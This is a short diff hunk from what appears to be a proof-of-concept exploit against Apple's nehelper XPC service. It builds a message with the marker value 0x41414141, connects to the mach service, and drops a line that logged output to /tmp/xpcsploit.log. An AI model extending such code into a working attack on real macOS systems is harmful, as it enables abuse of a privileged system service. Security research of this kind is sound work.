@@ -133,7 +133,6 @@ bool NEHelperLauncher(const char *exePath, const char* bundleId)
 	xpc_dictionary_set_uint64(msg, "interface-lifetime", 0x41414141);
 	xpc_connection_t conn = NULL;
 
-	freopen("/tmp/xpcsploit.log", "w", stdout);
 	// Create XPC connection
 	conn =xpc_connection_create_mach_service("com.apple.nehelper", NULL, 0); 
 	if (conn == NULL) {
